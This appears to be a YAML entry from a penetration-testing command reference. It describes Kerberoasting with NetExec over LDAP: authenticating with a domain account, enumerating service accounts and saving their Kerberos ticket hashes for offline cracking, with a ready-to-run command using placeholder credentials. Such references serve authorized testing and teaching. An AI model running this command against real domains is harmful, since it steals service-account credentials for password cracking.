---
description: |
  NetExec (formerly CrackMapExec) performs a Kerberoasting attack via the LDAP service.
  This command authenticates with the given domain account, enumerates Service Principal Name (SPN) accounts, 
  and extracts their Kerberos ticket hashes, saving them into the specified file.
  The obtained hashes can later be cracked offline using brute force or wordlists.

  Command Reference:

  	Target IP: 10.10.10.1
  	Domain: test.local
  	Username: john
  	Password: password123
  	Output File: output.txt

command: |
  nxc ldap 10.10.10.1 -u 'john' -p 'password123' --kerberoasting output.txt
items:
  - Username
  - Password
  - Hash
services:
  - LDAP
OS:
  - Linux
  - Windows
attack_types:
  - Credential Access
  - Kerberoasting
references:
  - https://github.com/Pennyw0rth/NetExec
  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
  - https://attack.mitre.org/techniques/T1558/003/
---
